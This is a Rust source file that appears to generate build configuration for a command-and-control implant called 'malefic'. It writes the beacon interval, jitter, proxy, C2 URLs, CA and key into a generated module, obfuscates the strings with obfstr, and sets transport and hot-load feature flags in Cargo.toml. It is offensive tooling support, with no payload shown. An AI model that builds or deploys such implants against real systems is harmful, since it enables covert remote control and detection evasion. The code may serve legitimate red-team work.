use std::fs;
use std::fs::File;
use std::io::Write;
use toml_edit::{Array, DocumentMut};
use crate::{Basic, ImplantConfig, FEATURES};

static CONFIG_FILE_GENE_PATH: &str = "malefic-core/src/config/mod.rs";
static CONFIG_CORE_TOML_PATH: &str = "malefic-core/Cargo.toml";

pub fn update_core_config(server: &Basic) {
    let mut file = File::create(CONFIG_FILE_GENE_PATH.to_string()).unwrap();

    let urls_str: String = server.targets.iter()
        .map(|url| {
            format!("\t\tobfstr::obfstr!(\"{}\").to_string(),\n", url)
        })
        .collect();

    let ca_str = if server.ca.is_empty() {
        "b\"\"".to_string()
    } else {
        format!("include_bytes!(\"{}\")", server.ca)
    };

    let content = format!(
        r#"use lazy_static::lazy_static;

lazy_static! {{
    pub static ref INTERVAL: u64 = {interval};
    pub static ref JITTER: f64 = {jitter} as f64;
    pub static ref NAME: String = obfstr::obfstr!("{name}").to_string();
    pub static ref PROXY: String = obfstr::obfstr!("{proxy}").to_string();
    pub static ref URLS: Vec<String> = vec![
        {urls}      ];
    pub static ref CA: &'static [u8] = {ca};
    pub static ref KEY: Vec<u8> = "{key}".into();
}}
"#,
        interval = server.interval,
        jitter = server.jitter,
        name = server.name,
        proxy = server.proxy,
        urls = urls_str,
        ca = ca_str,
        key = server.key
    );

    file.write_all(content.as_bytes()).expect("write config file error");
}


pub fn update_core_toml(server: &Basic,  implant: &ImplantConfig) {
    let cargo_toml_content = fs::read_to_string(CONFIG_CORE_TOML_PATH)
        .expect("Failed to read Cargo.toml file");

    let mut cargo_toml: DocumentMut = cargo_toml_content.parse()
        .expect("Failed to parse Cargo.toml file");
    
    if let Some(features) = cargo_toml[&FEATURES].as_table_mut() {
        let mut default_feature = Array::new();
        if implant.hot_load {
            default_feature.push("hot_load".to_string());
        }

        if implant.register_info {
            default_feature.push("register_info".to_string());
        }

        match server.protocol.as_str() { 
            "tcp" => {
                default_feature.push("Transport_Tcp".to_string());
            },
            _ => {}
        }
        if server.tls {
            default_feature.push("Transport_Tls".to_string());
        }
        features["default"] = toml_edit::Item::Value(default_feature.into());
    }
    fs::write(CONFIG_CORE_TOML_PATH, cargo_toml.to_string())
        .expect("Failed to write updated Cargo.toml file");
    println!("Cargo.toml file {:#?} has been updated.", CONFIG_CORE_TOML_PATH);
}